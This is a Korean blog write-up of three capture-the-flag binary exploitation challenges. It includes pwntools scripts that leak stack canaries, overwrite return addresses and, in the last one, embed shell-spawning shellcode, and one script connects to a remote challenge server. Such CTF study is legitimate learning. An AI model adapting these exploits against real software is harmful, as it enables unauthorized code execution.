---
title: "[Pwn] Pwn Study Weak 2"
date: 2021-11-29T09:24:22+09:00
categories:
- Pwn
- Whois
tags:
- Pwn
keywords:
- tech
#thumbnailImage: //example.com/image.jpg
---

<!--more-->

이번에도 Whois 신입 회원 교육 과제를 포스팅하려고 한다. (1번 문제는 면제받았다!)  


# passcode

![problem](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/passcode/problem.PNG?raw=true)

까나리 문제구나.. 냄새난다.. 일단 실행부터 해보자.  

![ex](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/passcode/ex.PNG?raw=true)

두 번의 입력, 중간의 한 번의 출력. 이는 명백한 canary 출력을 이용한 문제다.  
그 전에 main부터 확인해보자.

![pd main](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/passcode/pd%20main.PNG?raw=true)

흠.. 전체적으로 보면 잘 모르겠지만, 중요해보이는 부분이 몇 개 있다. 첫 번째가 아래다.  

![fque](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/passcode/fque.PNG?raw=true)

generate_passcode 함수를 실행한 후, rbp-0x8에 0x4040b0의 데이터를 복사한다.  
처음에는 무엇인지 이해하기 어렵지만 main의 아래를 보면 이해할 수 있다.  

![cmp](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/passcode/cmp.PNG?raw=true)

canary다. 자체적으로 걸린 보호기법이 아닌 사람이 직접 만든 canary라는 것이다.. (존-경)  
그러면 canary의 생성루틴을 확인해보자.  

![pd generate](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/passcode/pd%20generate.PNG?raw=true)

흠.. 0x402008를 open을 통해서 열고, read 함수로 읽은 값을 다양한 연산을 하고  
rbp-0x8 위치에 하나씩 삽입한다. 그렇다면 0x402008이 뭘까?  

![ran](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/passcode/ran.PNG?raw=true)

urandom, 즉 랜덤함수다. 처음의 필자는 이 부분에서 urandom 취약점인 줄 알고 시간을 엄청 소비했다.  
하지만 반환 랜덤값에 추가적인 연산이 더해지면서 이러한 취약점은 방어되었다.  
그렇다면 canary를 출력해보자. main을 보면 rbp-0x20에서부터 입력을 받는데,  
canary는 rbp-0x8에 위치해있다. 이는 문자열을 0x18번 입력한 후, Enter가 아닌 eof로 종료하여  
Canary까지 출력함으로서 문제를 해결할 수 있다.  

![canary](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/passcode/canary.PNG?raw=true)

이렇게 canary를 알아낼 수 있다. 이를 이용해서 ret를 변조할 수 있는데, 해당 파일은 NX가 걸려있다.  
즉, Stack에서 실행권한이 없다. 그렇다면 다른 함수는 없을까? 찾아보자.  

![win](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/passcode/win.PNG?raw=true)

info func을 통해서 찾은 결과 win 함수를 찾을 수 있었다. 내부 소스를 보자.  

![pd win](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/passcode/pd%20win.PNG?raw=true)

system 함수로 cat flag를 실행한다. 즉, 이 함수 시작 주소를 ret에 넣어줘서 문제를 풀면 된다.  
지금까지의 모든 정보를 종합하여 payload를 작성하면 아래와 같다.  

```Python3
from pwn import *
context.log_level='debug'

#r = process('./passcode', stdin=PTY, raw=False)
r = remote('49.50.167.74', 5202)

r.recvuntil(':D')
r.send("AAAAAAAAAAAAAAAAAAAAAAAA")

tmp = r.recvline()
tmp = r.recvline()
tmp1 = tmp[-12:-4]

tmp2 = list(tmp1)
tmp3 = [0, 0, 0, 0, 0, 0, 0, 0]

for i in range(0,8):
	tmp3[i] = int(tmp2[i])
	
r.recvuntil('passcode?')

ret = 0x00000000004012d0
A = 0x4141414141414141

pay = p64(A) + p64(A) + p64(A) + bytes([tmp3[0]])+bytes([tmp3[1]])+bytes([tmp3[2]])+bytes([tmp3[3]])+bytes([tmp3[4]])+bytes([tmp3[5]])+bytes([tmp3[6]])+bytes([tmp3[7]])+ p64(A) + p64(ret)

r.send(pay)
r.interactive()
```

![flag](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/passcode/flag.PNG?raw=true)

#assemlator

두 번째 문제다.  

![problem](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/assemlator/problem.PNG?raw=true)

흐어.. 어셈..싫어..  

![play](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/assemlator/play.PNG?raw=true)

내가 뭐를 했다고 틀렸다고 하십니까...  
gdb를 통해서 열어보자.  

![pd main](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/assemlator/pd%20main.PNG?raw=true)

흠.. 전체적으로 무난한데, 한 가지 특이한 부분이 있다.  

![important](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/assemlator/important.PNG?raw=true)

scanf하여 입력받은 문자열을 assembly_calc에 인자로 넘겨주어 실행한다.  
그 이후는 canary니까 무관하다. 그렇다면 assembly_calc를 열어보자!  

![pd assembly_calc](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/assemlator/pd%20assembly_calc.PNG?raw=true)

전체적으로 보면 파일을 열고 이를 읽어서 몇 가지 추가적인 연산을 한 후에,  
최종적으로 0x123456789와 같은지 검사한다.  

![cmp](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/assemlator/cmp.PNG?raw=true)

코드를 보다보면 결국 하는 것이라고는 xor과 sub 0xdcba이다.  
그렇다면 거꾸로 생각해보자. 0x123456789에 0xdcba를 더하면 그 전의 값이 나올 것이다.  
이는 0x123464443이다. xor만 역연산하면 된다. 이는 특정한 값이 0xabcd와 xor하여 나온 값이  
0x123464443이라는 것이다. 하위 2byte만 보면 된다. 0xabcd가 2byte이기 때문이다.  
0xabcd의 2진수는 다음과 같다. 1010 1011 1100 1101, 여기서 최종적으로 0100 0100 0100 0011이  
나와야 한다. xor은 둘이 다를 경우가 1이 된다. 즉, 생각해보면 정답을 도출해낼 수 있다.  
우리가 입력해야 하는 값은 1110 1111 1000 1110 이다. 이를 16진수로 변환하면 0xEF8E다.  
모든 정보를 종합하여 최종적으로 0x12346EF8E가 되며, Scanf를 %lld로 받기 때문에 정답의 10진수인  
4886818702를 입력해야 한다.  

![flag](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/assemlator/flag.PNG?raw=true)

# canacode

마지막이다. 문제 확인부터..

![problem](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/canacode/problem.PNG?raw=true)

흠.. 일단 다운받아서 실행해보자.   

![play](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/canacode/play.PNG?raw=true)

2번의 출력, 1번의 입력, 아까 풀었던 canary와 매우 유사하다! 그렇다면 main을 확인해보자.  

![pd main](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/canacode/pd%20main.PNG?raw=true)

전체적인 구조는 canary와 유사하다. 차이점은 canary가 수동이 아닌 보호기법으로서 걸려있다는 것.  

![cmp](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/canacode/cmp.PNG?raw=true)

그리고 rbp-0x30의 데이터와 0x4020b5를 비교한다는 것이다. 0x4020b5가 뭘까?  

![str](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/canacode/str.PNG?raw=true)

단순한 대답이다. 이제 canary만 알아내면 ret 변조가 가능하다! 이는 첫 read를 이용해서 출력할 것이다.  

![fscan](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/canacode/fscan.PNG?raw=true)

코드를 보면 rbp-0x40에서 입력을 받는데, canary는 rbp-0x8에 위치해있다.  
즉, 둘 사이에 0x38만큼의 차이가 존재하며 그 다음에 canary가 존재한다는 것이다.  
canary는 가장 첫 8bits가 0으로 채워져 있다. 이는 기존 문자열과의 혼동을 방지하기 위해서인데,  
이를 임의의 문자로 채워주는 것으로 출력할 때, canary도 같이 출력하게 할 수 있다.  
즉, A를 0x38만큼 입력하고 B를 입력해주면 canary의 첫 1byte가 B로 바뀌면서 같이 출력될 것이다.  

![canary](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/canacode/canary.PNG?raw=true)

성공! 이제 ret를 변조하면 된다. 필자가 목표로 해야하는 지점은 init_shell 함수,  
시작 주소를 찾아보자!!  

![shell](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/canacode/shell.PNG?raw=true)

![pd shell](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/canacode/pd%20shell.PNG?raw=true)

이렇게 시작주소를 알아냈으니 이를 little endian으로 ret에 위치에 넣어주면?  
다음과 같이 init_shell 함수가 실행되는 것을 확인할 수 있다.  
(init_shell이 실행되면 

![inshell](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/canacode/inshell.PNG?raw=true)

![inshell2](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/canacode/inshell2.PNG?raw=true)

필자의 페이로드도 같이 남겨두겠다!  

```Python3
from pwn import *
import tty
context.log_level='debug'


r = process('./canacode')
gdb.attach(r)

r.recvuntil('name?')
r.send("A"*0x38+"B")
tmp = r.recvuntil('AB')
tmp = r.recvline()
tmp1 = tmp[0:7]

r.recvuntil('[Yes/No]')

ans = 0x5965734141414141
pad = 0x4141414141414141
shell1 = 0x31f648bb2f62696e
shell2 = 0x2f2f73685653545f
shell3 = 0x6a3b5831d20f0500
ret = 0x00000000004011f3

pay = p64(ans, endian='big') + p64(shell1, endian='big') + p64(shell2, endian='big') + p64(shell3, endian='big') +p64(pad) + b'\x00' + tmp1 + p64(pad) + p64(ret)

r.send(pay)

r.interactive()
```
